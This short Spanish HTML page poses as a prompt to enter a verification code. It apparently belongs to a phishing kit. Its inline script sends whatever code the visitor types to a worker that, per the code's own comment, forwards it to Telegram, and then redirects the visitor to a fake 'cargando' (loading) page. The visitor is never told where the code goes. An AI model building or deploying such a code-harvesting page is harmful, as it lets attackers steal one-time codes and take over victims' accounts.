<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Ingresar código</title>
</head>
<body>
  <h2>Ingresa tu código de verificación</h2>

  <form id="codeForm">
    <input type="text" id="codigo" name="codigo" placeholder="Código" required />
    <button type="submit">Enviar</button>
  </form>

  <script>
    document.getElementById('codeForm').addEventListener('submit', async function (e) {
      e.preventDefault();
      const codigo = document.getElementById('codigo').value;

      // --- Enviar a Telegram usando el Worker ---
      try {
        await fetch('worker.js', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            mensaje: `Código ingresado: ${codigo}`
          })
        });
      } catch (err) {
        console.error('Error enviando a Telegram:', err);
      }

      // --- Redirigir a cargando.html ---
      window.location.href = 'cargando.html';
    });
  </script>
</body>
</html>
